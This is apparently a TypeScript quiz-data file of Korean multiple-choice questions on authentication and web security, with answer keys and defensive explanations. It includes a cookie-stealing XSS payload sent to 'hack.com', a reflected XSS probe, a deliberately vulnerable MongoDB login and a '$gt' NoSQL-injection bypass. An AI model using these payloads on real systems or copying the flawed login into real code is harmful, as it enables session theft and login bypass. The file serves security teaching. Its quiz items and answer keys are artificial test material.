import type { Problem } from '@/types'

export const authSecurityProblems: Problem[] = [
  // ─── JWT ─────────────────────────────────────────────────────────────────────

  {
    id: 'auth-q-001',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'easy',
    title: 'JWT 구조 — Header.Payload.Signature',
    description: '다음 JWT 토큰의 Payload(중간 부분)를 디코딩하면 나타나는 정보로 올바른 것은?\n\n`eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDB9.xxx`',
    options: [
      'Payload는 암호화되어 있어 디코딩해도 읽을 수 없다',
      'Payload는 Base64Url 인코딩이므로 디코딩하면 { userId: "123", role: "admin", iat: 1700000 } 같은 JSON이 나온다',
      'Payload에는 서버의 비밀 키가 저장된다',
      'Payload는 항상 빈 객체이다',
    ],
    correctAnswer: 1,
    explanation:
      'JWT Payload는 암호화(Encryption)가 아닌 Base64Url 인코딩만 되어 있어 누구나 디코딩해서 읽을 수 있습니다. 따라서 민감한 정보(비밀번호, 신용카드 등)를 Payload에 넣으면 안 됩니다. 무결성(변조 방지)은 Signature로 보장하지만, 기밀성(내용 숨김)은 JWT 자체로 제공되지 않습니다.',
    hints: ['Base64Url = 인코딩 (암호화 아님)', 'jwt.io에서 직접 디코딩 가능'],
    deepDive:
      'JWT 구조:\n• Header: { alg: "HS256", typ: "JWT" } — 서명 알고리즘\n• Payload: { sub: "userId", role: "admin", iat: 발급시각, exp: 만료시각 }\n• Signature: HMACSHA256(base64(header) + "." + base64(payload), secretKey)\n\nClaims(Payload 필드):\n• iss (Issuer): 토큰 발급자\n• sub (Subject): 토큰 대상 (userId)\n• aud (Audience): 토큰 수신자\n• exp (Expiration): 만료 시각 (Unix timestamp)\n• iat (Issued At): 발급 시각\n• nbf (Not Before): 이 시각 이전에는 무효\n\n보안 원칙:\n• Payload에 비밀번호/민감정보 절대 금지\n• 토큰 자체를 탈취당하면 만료 전까지 유효 → 짧은 만료 시간 설정\n• 서명 검증 필수: jwt.verify() (verify 없이 decode만 하면 위험)',
    relatedProblems: ['auth-q-002', 'auth-q-003'],
  },
  {
    id: 'auth-q-002',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Access Token vs Refresh Token',
    description: 'Access Token과 Refresh Token의 역할 분리가 필요한 이유는?',
    options: [
      'Access Token과 Refresh Token은 동일하며 단순히 이름만 다르다',
      'Access Token은 짧게 유지하여 탈취 피해를 최소화하고, Refresh Token은 길게 유지하여 사용자가 매번 로그인하지 않아도 되게 한다',
      'Refresh Token은 서버 메모리에만 저장되고 클라이언트에는 전달되지 않는다',
      'Access Token이 만료되면 자동으로 새 Access Token이 발급된다',
    ],
    correctAnswer: 1,
    explanation:
      'Access Token은 짧은 만료 시간(15분~1시간)으로 API 인증에 사용합니다. 탈취되어도 빠르게 만료됩니다. Refresh Token은 긴 만료 시간(7일~30일)으로 새 Access Token 발급에만 사용합니다. 이 분리로 보안(짧은 Access Token)과 편의성(Refresh로 재로그인 최소화)을 동시에 달성합니다.',
    hints: ['짧은 수명 + 긴 수명의 조합', '탈취 피해 최소화'],
    deepDive:
      'Token Rotation 패턴 (보안 강화):\n```\n1. 로그인 → Access Token(15분) + Refresh Token(7일) 발급\n2. API 호출 시 Access Token 헤더 첨부\n3. Access Token 만료 → Refresh Token으로 갱신 요청\n4. 서버: Refresh Token 검증 → 새 Access Token + 새 Refresh Token 발급\n   (Refresh Token Rotation: 이전 RT는 무효화)\n5. Refresh Token도 만료 → 재로그인\n```\n\nRefresh Token 저장 위치:\n• httpOnly Cookie (권장): JS 접근 불가, CSRF 방어 필요\n• localStorage (비권장): XSS 공격에 노출\n\nNestJS 구현:\n```typescript\n// Access Token 발급\njwtService.sign(payload, { expiresIn: "15m" })\n// Refresh Token 발급\njwtService.sign(payload, { expiresIn: "7d", secret: RT_SECRET })\n```',
    relatedProblems: ['auth-q-001', 'auth-q-003', 'auth-q-004'],
  },
  {
    id: 'auth-q-003',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'JWT 저장 위치 — localStorage vs httpOnly Cookie',
    description: 'JWT를 localStorage에 저장하는 것과 httpOnly Cookie에 저장하는 것의 보안 차이는?',
    options: [
      'localStorage가 더 안전하다. 서버만 접근할 수 있기 때문이다',
      'httpOnly Cookie가 더 안전하다. JavaScript에서 접근할 수 없어 XSS 공격으로 토큰을 탈취할 수 없다',
      '두 방식의 보안은 동일하다',
      'Cookie는 HTTPS에서만 작동한다',
    ],
    correctAnswer: 1,
    explanation:
      'httpOnly Cookie는 JavaScript로 접근 불가(document.cookie로 읽을 수 없음)하여 XSS 공격에서 토큰이 탈취되지 않습니다. localStorage는 XSS 취약점이 있으면 `localStorage.getItem("token")`으로 바로 탈취됩니다. 단, httpOnly Cookie는 CSRF 공격에 취약하므로 SameSite=Strict/Lax 또는 CSRF Token을 함께 사용해야 합니다.',
    hints: ['XSS = JavaScript 코드 주입 공격', 'httpOnly = JS 접근 불가'],
    deepDive:
      '저장 위치별 비교:\n\nlocalStorage:\n• XSS에 취약 (공격자 JS로 바로 탈취 가능)\n• CSRF에 안전 (자동 전송 안 됨)\n• SPA에서 구현 쉬움\n\nhttpOnly Cookie:\n• XSS에 안전 (JS 접근 불가)\n• CSRF에 취약 (자동 전송됨) → SameSite 속성으로 방어\n• Secure 플래그: HTTPS에서만 전송\n\n권장 설정:\n```typescript\n// NestJS에서 httpOnly Cookie 설정\nres.cookie("refreshToken", token, {\n  httpOnly: true,    // JS 접근 불가\n  secure: true,      // HTTPS만\n  sameSite: "strict", // CSRF 방어\n  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7일\n})\n```\n\nNext.js App Router: httpOnly Cookie는 Server Action에서 설정 권장',
    relatedProblems: ['auth-q-001', 'auth-q-002', 'auth-q-009', 'auth-q-010'],
  },
  {
    id: 'auth-q-004',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'JWT 만료 처리 패턴',
    description: 'Access Token이 만료된 401 응답을 받았을 때 클라이언트(Next.js)가 처리하는 올바른 패턴은?',
    options: [
      '401을 받으면 즉시 로그인 페이지로 리다이렉트한다',
      '401을 받으면 Refresh Token으로 새 Access Token을 발급 시도하고, 실패하면 로그인으로 리다이렉트한다',
      'Access Token은 만료되지 않도록 무한 유효기간으로 발급한다',
      'Access Token이 만료되면 자동으로 서버가 새 토큰을 응답 헤더에 넣어준다',
    ],
    correctAnswer: 1,
    explanation:
      '올바른 패턴: ① API 요청 → 401 수신 → ② Refresh Token으로 /auth/refresh 요청 → ③ 새 Access Token 발급 성공 → 원래 요청 재시도 → ④ Refresh Token도 만료되면 로그인 페이지로. 이 로직을 axios interceptor나 fetch wrapper에서 구현하면 모든 API 호출에 자동 적용됩니다.',
    hints: ['Refresh Token이 있는 이유', '요청 재시도가 포인트'],
    deepDive:
      '```typescript\n// axios interceptor로 자동 token refresh\naxios.interceptors.response.use(\n  (response) => response,\n  async (error) => {\n    const originalRequest = error.config\n\n    // 401이고 아직 재시도 안 했을 때\n    if (error.response?.status === 401 && !originalRequest._retry) {\n      originalRequest._retry = true\n\n      try {\n        // Refresh Token으로 새 AT 발급\n        const { data } = await axios.post("/auth/refresh")\n        const newAccessToken = data.accessToken\n\n        // 헤더 업데이트\n        axios.defaults.headers.common["Authorization"] = `Bearer ${newAccessToken}`\n        originalRequest.headers["Authorization"] = `Bearer ${newAccessToken}`\n\n        // 원래 요청 재시도\n        return axios(originalRequest)\n      } catch (refreshError) {\n        // Refresh도 실패 → 로그인으로\n        window.location.href = "/login"\n        return Promise.reject(refreshError)\n      }\n    }\n\n    return Promise.reject(error)\n  }\n)\n```',
    relatedProblems: ['auth-q-002', 'auth-q-005'],
  },

  // ─── OAuth / 인증 흐름 ────────────────────────────────────────────────────────

  {
    id: 'auth-q-005',
    category: 'auth-security',
    subcategory: 'oauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'OAuth 2.0 Authorization Code Flow',
    description: 'Google 소셜 로그인(OAuth 2.0)의 올바른 흐름 순서는?',
    options: [
      '사용자 → 서버에 비밀번호 전달 → 서버가 Google에 대신 로그인',
      '사용자 → Google 로그인 페이지 → Authorization Code 발급 → 서버가 Code를 Access Token으로 교환 → Google 사용자 정보 조회',
      '사용자 → Google에서 바로 Access Token 발급 → 클라이언트에서 Google API 직접 호출',
      '서버 → Google에 사용자 정보 요청 → Google이 직접 사용자에게 토큰 전달',
    ],
    correctAnswer: 1,
    explanation:
      'Authorization Code Flow: ① 사용자가 "Google로 로그인" 클릭 → ② Google 로그인/동의 페이지로 리다이렉트 → ③ 사용자 동의 → Google이 Authorization Code를 redirect_uri로 전달 → ④ 서버(백엔드)가 Code + Client Secret으로 Google에 Access Token 교환 요청 → ⑤ Access Token으로 Google 사용자 정보 조회 → ⑥ 자체 JWT 발급. Code를 서버에서 교환하는 이유: Client Secret이 클라이언트에 노출되지 않도록.',
    hints: ['Authorization Code = 중간 단계 코드', 'Client Secret은 서버에서만'],
    deepDive:
      'Authorization Code Flow (PKCE 포함):\n```\n클라이언트 → 서버: "Google 로그인 URL 주세요"\n서버 → 클라이언트: https://accounts.google.com/o/oauth2/auth?\n  client_id=xxx&redirect_uri=xxx&scope=email+profile&response_type=code\n\n사용자가 Google에서 로그인 + 동의\n\nGoogle → 클라이언트(redirect_uri): ?code=AUTHORIZATION_CODE\n\n클라이언트 → 서버: code 전달\n서버 → Google: POST /token { code, client_secret, grant_type }\nGoogle → 서버: { access_token, refresh_token, id_token }\n\n서버: Google API로 사용자 정보 조회\n서버 → 클라이언트: 자체 JWT 발급\n```\n\nNextAuth.js는 이 전체 흐름을 자동 처리합니다.',
    relatedProblems: ['auth-q-006', 'auth-q-007'],
  },
  {
    id: 'auth-q-006',
    category: 'auth-security',
    subcategory: 'oauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'OAuth vs OpenID Connect (OIDC)',
    description: 'OAuth 2.0과 OpenID Connect(OIDC)의 차이로 올바른 것은?',
    options: [
      'OAuth와 OIDC는 완전히 동일한 프로토콜이다',
      'OAuth 2.0은 인가(Authorization/리소스 접근 권한) 프로토콜이고, OIDC는 OAuth 위에 인증(Authentication/사용자 신원 확인)을 추가한 것이다',
      'OIDC는 OAuth보다 오래된 구버전 프로토콜이다',
      'OAuth는 사용자 로그인에만 사용할 수 있다',
    ],
    correctAnswer: 1,
    explanation:
      'OAuth 2.0은 "A 서비스가 B 서비스의 리소스에 접근하는 권한"을 위한 인가(Authorization) 프로토콜입니다. 원래 "이 사람이 누구인가(신원 확인)"를 위한 프로토콜이 아닙니다. OIDC(OpenID Connect)는 OAuth 2.0 위에 ID Token(JWT)과 UserInfo 엔드포인트를 추가하여 인증(Authentication)도 처리합니다. Google/Kakao 소셜 로그인은 대부분 OIDC를 사용합니다.',
    hints: ['OAuth = 권한 위임, OIDC = 신원 확인 추가'],
    deepDive:
      '구분 예시:\n• OAuth만 사용: "내 앱이 사용자의 Google Drive에 접근할 수 있도록 허락받기"\n• OIDC 사용: "Google 계정으로 내 서비스에 로그인하기 (신원 확인)"\n\nID Token (OIDC):\n• JWT 형식\n• Payload: sub(사용자 ID), email, name, picture 등\n• 서버가 ID Token을 검증하여 사용자 신원 확인\n\nNextAuth.js: 내부적으로 OIDC를 사용\n```typescript\n// NextAuth providers\nGoogleProvider({  // OIDC 사용\n  clientId: process.env.GOOGLE_ID!,\n  clientSecret: process.env.GOOGLE_SECRET!,\n})\n```',
    relatedProblems: ['auth-q-005', 'auth-q-007'],
  },
  {
    id: 'auth-q-007',
    category: 'auth-security',
    subcategory: 'session-cookie',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Session vs JWT Token 방식 비교',
    description: 'Session 방식과 JWT 방식의 차이로 올바른 것은?',
    options: [
      'Session은 클라이언트에, JWT는 서버에 상태를 저장한다',
      'Session은 서버 DB/메모리에 상태를 저장(stateful)하고, JWT는 토큰 자체에 정보를 포함(stateless)한다',
      'JWT는 로그아웃을 지원하지 않는다 (불가능하다)',
      'Session 방식이 항상 더 빠르다',
    ],
    correctAnswer: 1,
    explanation:
      'Session은 서버(DB, Redis, 메모리)에 세션 데이터를 저장하고 클라이언트는 Session ID만 Cookie로 가집니다(Stateful). JWT는 토큰 자체에 사용자 정보와 만료 시간을 포함하여 서버가 별도 저장소 없이 검증합니다(Stateless). JWT도 Blacklist(Redis에 무효화된 토큰 저장)로 로그아웃을 구현할 수 있습니다.',
    hints: ['Stateful vs Stateless', '서버가 상태를 저장하는가?'],
    deepDive:
      'Session vs JWT 선택 기준:\n\nSession(Stateful):\n✅ 즉시 로그아웃/무효화 가능\n✅ 세션 데이터 서버에서 직접 수정 가능\n❌ 서버 확장 시 세션 공유 필요 (Redis Sticky Session)\n❌ 서버 부하 (모든 요청마다 DB 조회)\n\nJWT(Stateless):\n✅ 서버 확장 용이 (어느 서버도 검증 가능)\n✅ 서버 부하 적음 (DB 조회 불필요)\n❌ 토큰 탈취 시 만료 전까지 무효화 어려움\n❌ Payload 수정 불가 (새 토큰 발급 필요)\n\n실무:\n• MSA/수평 확장 → JWT\n• 즉각적인 권한 제어 필요 → Session + Redis\n• NextAuth.js: 기본 Session 방식, JWT 방식 선택 가능',
    relatedProblems: ['auth-q-001', 'auth-q-003'],
  },

  // ─── 웹 보안 ─────────────────────────────────────────────────────────────────

  {
    id: 'auth-q-008',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'CORS — 원인과 해결',
    description: 'CORS 에러가 발생하는 이유와 해결 방법으로 올바른 것은?',
    options: [
      'CORS는 서버가 다운됐을 때 발생하는 에러다',
      '브라우저가 다른 Origin(프로토콜+도메인+포트)으로의 요청을 기본 차단하며, 서버가 허용 Origin을 응답 헤더에 포함해야 해결된다',
      'CORS는 클라이언트에서 해결해야 하며 서버와 무관하다',
      'HTTPS를 사용하면 CORS가 자동으로 해결된다',
    ],
    correctAnswer: 1,
    explanation:
      'CORS(Cross-Origin Resource Sharing)는 브라우저의 Same-Origin Policy 때문에 발생합니다. localhost:3000에서 localhost:8000으로 요청하면 포트가 달라 다른 Origin으로 간주되어 차단됩니다. 서버가 Access-Control-Allow-Origin 헤더에 허용할 Origin을 명시해야 합니다. CORS는 서버에서 해결해야 합니다.',
    hints: ['Same-Origin Policy = 브라우저의 보안 정책', '서버에서 허용 설정 필요'],
    deepDive:
      'CORS 해결:\n```typescript\n// NestJS\nimport { NestFactory } from "@nestjs/core"\nconst app = await NestFactory.create(AppModule)\napp.enableCors({\n  origin: ["http://localhost:3000", "https://myapp.com"],\n  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],\n  allowedHeaders: ["Content-Type", "Authorization"],\n  credentials: true,  // Cookie 포함 요청 허용\n})\n\n// Next.js API Routes\nexport async function GET(req: Request) {\n  return NextResponse.json(data, {\n    headers: { "Access-Control-Allow-Origin": "https://myapp.com" },\n  })\n}\n```\n\nPreflight Request (OPTIONS):\n• 브라우저가 실제 요청 전에 OPTIONS 메서드로 서버에 허용 여부 확인\n• 발생 조건: 커스텀 헤더, PUT/DELETE, Content-Type이 multipart 등\n• 서버가 OPTIONS에 200 응답 + Access-Control 헤더 포함해야 함\n\n✋ credentials: true면 Access-Control-Allow-Origin: * 사용 불가!',
    relatedProblems: ['auth-q-009', 'auth-q-010'],
  },
  {
    id: 'auth-q-009',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'XSS — Cross-Site Scripting',
    description: '다음 중 XSS(Cross-Site Scripting) 공격에 해당하는 것은?',
    options: [
      '공격자가 다른 사이트에서 사용자 모르게 폼을 제출하는 공격',
      '공격자가 악성 JavaScript를 웹 페이지에 삽입하여 사용자 브라우저에서 실행되게 하는 공격',
      '공격자가 SQL 쿼리를 조작하여 DB를 탈취하는 공격',
      '서버에 대량의 요청을 보내 서비스를 마비시키는 공격',
    ],
    correctAnswer: 1,
    explanation:
      'XSS는 공격자가 악성 JavaScript를 웹 페이지에 삽입하여 피해자 브라우저에서 실행되게 하는 공격입니다. 쿠키/localStorage 탈취, 키로거 설치, 피싱 페이지 표시 등이 가능합니다. 선택지 1은 CSRF, 3은 SQL Injection, 4는 DDoS입니다.',
    hints: ['X = Cross-Site, S = Scripting = 스크립트 주입'],
    deepDive:
      'XSS 유형:\n• Stored XSS: DB에 저장된 악성 스크립트가 페이지 렌더링 시 실행\n  예: 게시판에 `<script>document.location="hack.com?c="+document.cookie</script>` 저장\n• Reflected XSS: URL 파라미터의 악성 스크립트가 응답에 그대로 반영\n  예: /search?q=<script>alert(1)</script>\n• DOM XSS: 클라이언트 JavaScript가 안전하지 않게 DOM 조작\n\n방어:\n```typescript\n// 1. React/Next.js의 기본 이스케이프 (JSX)\n<div>{userInput}</div>  // 자동 이스케이프 ✅\n<div dangerouslySetInnerHTML={{__html: userInput}} />  // XSS 위험! ❌\n\n// 2. 입력값 검증 및 새니타이징\nimport DOMPurify from "dompurify"\nconst clean = DOMPurify.sanitize(userInput)\n\n// 3. Content-Security-Policy 헤더\n"Content-Security-Policy": "script-src \'self\'"\n\n// 4. httpOnly Cookie (XSS로 토큰 탈취 방지)\n```',
    relatedProblems: ['auth-q-003', 'auth-q-010'],
  },
  {
    id: 'auth-q-010',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'CSRF — Cross-Site Request Forgery',
    description: 'CSRF 공격과 SameSite Cookie로 방어하는 원리로 올바른 것은?',
    options: [
      'CSRF는 서버 직접 해킹이며 SameSite는 암호화로 방어한다',
      '사용자가 로그인된 상태에서 다른 사이트의 악성 폼/링크가 사용자 권한으로 요청을 보내는 공격이며, SameSite=Strict/Lax Cookie로 다른 사이트에서의 쿠키 전송을 차단한다',
      'CSRF는 XSS와 동일한 공격이다',
      'HTTPS를 사용하면 CSRF가 자동 방어된다',
    ],
    correctAnswer: 1,
    explanation:
      'CSRF: 사용자가 bank.com에 로그인된 상태에서 evil.com을 방문하면, evil.com의 악성 코드가 bank.com/transfer로 요청을 보냅니다. 브라우저가 자동으로 bank.com 쿠키를 첨부하므로 서버는 정상 요청으로 인식합니다. SameSite=Strict: 다른 Origin에서의 요청에 쿠키를 전혀 포함하지 않음. SameSite=Lax: GET 제외 다른 Origin 요청에 쿠키 미포함.',
    hints: ['사용자 쿠키가 자동으로 전송되는 것을 이용'],
    deepDive:
      'CSRF 방어 방법:\n\n1. SameSite Cookie (권장):\n```typescript\nres.cookie("sessionId", token, {\n  sameSite: "strict",  // 다른 사이트 요청 시 쿠키 미전송\n  httpOnly: true,\n  secure: true,\n})\n```\n\n2. CSRF Token:\n• 서버가 랜덤 토큰 생성 → 폼에 hidden 필드로 포함\n• 요청 시 헤더/바디에 포함 → 서버 검증\n• evil.com은 이 토큰을 알 수 없음\n\n3. Origin/Referer 헤더 검증:\n• 서버가 요청의 Origin이 허용된 도메인인지 확인\n\nXSS vs CSRF 구분:\n• XSS: 공격 코드가 피해 사이트에서 실행됨 → 쿠키/토큰 탈취\n• CSRF: 공격 코드가 다른 사이트에서 실행됨 → 쿠키 자동 전송 이용',
    relatedProblems: ['auth-q-003', 'auth-q-009'],
  },
  {
    id: 'auth-q-011',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'NoSQL Injection — MongoDB',
    description: '다음 코드에서 발생할 수 있는 보안 취약점은?',
    code: `// 사용자 로그인 API
app.post("/login", async (req, res) => {
  const { email, password } = req.body
  const user = await User.findOne({ email, password })
  if (user) res.json({ success: true })
})`,
    options: [
      '성능 문제만 있을 뿐 보안 취약점은 없다',
      'NoSQL Injection 취약점. 공격자가 { "$gt": "" }를 body에 주입하면 모든 사용자가 로그인될 수 있다',
      'SQL Injection만 가능하고 MongoDB는 안전하다',
      'password가 평문이므로 DB 유출 시 위험하지만 로그인 우회는 불가능하다',
    ],
    correctAnswer: 1,
    explanation:
      '공격자가 `{ "email": "admin@example.com", "password": { "$gt": "" } }`를 전송하면 MongoDB 쿼리가 `{ email: "admin@example.com", password: { $gt: "" } }`가 되어 비밀번호가 빈 문자열보다 크면(=항상 참) 로그인이 성공합니다. 평문 비밀번호 저장도 심각한 문제입니다.',
    hints: ['MongoDB 연산자($gt, $ne 등)가 body에 올 수 있다면?'],
    deepDive:
      '방어 방법:\n```typescript\n// 1. express-mongo-sanitize 사용\nimport mongoSanitize from "express-mongo-sanitize"\napp.use(mongoSanitize())  // $ 시작 키를 자동 제거\n\n// 2. 입력값 타입 검증 (class-validator)\nexport class LoginDto {\n  @IsEmail()\n  email: string\n\n  @IsString()  // 객체 형태 거부\n  password: string\n}\n\n// 3. bcrypt로 비밀번호 해시 저장 후 비교\nconst user = await User.findOne({ email }).select("+password")\nconst isMatch = await bcrypt.compare(password, user.password)\n// bcrypt.compare는 해시 비교이므로 injection 불가\n\n// 4. 직접 연산자 필터링\nif (typeof password !== "string") throw new BadRequestException()\n```\n\nNestJS + class-validator + ValidationPipe(whitelist:true)를 사용하면 대부분의 NoSQL Injection을 차단할 수 있습니다.',
    relatedProblems: ['auth-q-012', 'be-q-009'],
  },
  {
    id: 'auth-q-012',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Password Hashing — bcrypt, salt, rainbow table',
    description: 'bcrypt로 비밀번호를 해시할 때 salt를 사용하는 이유는?',
    options: [
      'salt는 비밀번호를 암호화하여 원본 복원을 막는다',
      '같은 비밀번호라도 다른 해시를 생성하여 Rainbow Table 공격(미리 계산된 해시 테이블로 역추적)을 방어한다',
      'salt는 해시 속도를 빠르게 한다',
      'salt가 없으면 bcrypt를 사용할 수 없다',
    ],
    correctAnswer: 1,
    explanation:
      'salt는 각 비밀번호에 추가되는 랜덤 값으로, 같은 "password123"이라도 salt가 다르면 완전히 다른 해시가 생성됩니다. Rainbow Table(해시 → 원본 매핑 테이블)은 salt 없이 생성된 해시에만 효과적입니다. bcrypt는 salt를 자동으로 생성하고 해시에 포함시키므로 별도로 저장할 필요가 없습니다.',
    hints: ['같은 입력 + 다른 salt = 다른 해시', 'Rainbow Table = 미리 계산된 해시 목록'],
    deepDive:
      '```typescript\nimport * as bcrypt from "bcrypt"\n\n// 해시 생성 (saltRounds = cost factor)\nconst saltRounds = 10  // 2^10번 해시 반복 → 브루트포스 방어\nconst hash = await bcrypt.hash("password123", saltRounds)\n// "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"\n// $2b$ = bcrypt 버전\n// $10$ = cost factor\n// 나머지 = salt(22자) + hash\n\n// 검증 (salt는 해시 안에 포함되어 있음)\nconst isMatch = await bcrypt.compare("password123", hash)  // true\n\n// Mongoose pre("save") 훅에서 사용\nuserSchema.pre("save", async function(next) {\n  if (this.isModified("password")) {\n    this.password = await bcrypt.hash(this.password, 10)\n  }\n  next()\n})\n```\n\nbcrypt vs argon2:\n• bcrypt: 널리 사용, 안정적\n• argon2: 더 현대적, 메모리-하드 (GPU 공격 방어), 권장\n• 절대 금지: MD5, SHA1로 비밀번호 해시 (빠르기 때문에 브루트포스에 취약)',
    relatedProblems: ['auth-q-011', 'db-q-009'],
  },
]
